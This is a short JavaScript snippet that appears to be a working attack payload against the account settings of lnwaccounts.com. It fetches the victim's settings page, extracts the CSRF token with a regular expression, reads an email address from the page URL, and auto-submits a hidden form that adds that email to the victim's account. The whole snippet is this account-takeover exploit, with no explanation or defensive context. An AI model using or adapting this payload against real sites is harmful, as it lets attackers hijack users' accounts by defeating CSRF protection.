if (window.XMLHttpRequest){xmlhttp=new XMLHttpRequest();}
else{xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");}
xmlhttp.onreadystatechange=function()
{
	if (xmlhttp.readyState==4 && xmlhttp.status==200)
	{
		var settingHTML = xmlhttp.responseText;
		var patt1 =/[0-9a-f]{32}/i;
		var csrf_token = settingHTML.match(patt1);
		var email = window.location.href;
		email=email.split('?')
		var url = 'https://lnwaccounts.com/manage/setting/email/add';
		var form = $('<form action="' + url + '" method="post">' +
		'<input type="hidden" name="email" value="'+email[email.length-1]+'" />' +
		'<input type="hidden" name="ajaxxxx" value="true" />' +
		'<input type="hidden" name="ajaxxxx_dataType" value="json" />' +
		'<input type="hidden" name="csrf_token" value="'+csrf_token+'" />' +
		'</form>');
		$('body').append(form);
		$(form).submit();
	}
}
xmlhttp.open("GET","https://lnwaccounts.com/manage/setting",true);
xmlhttp.send();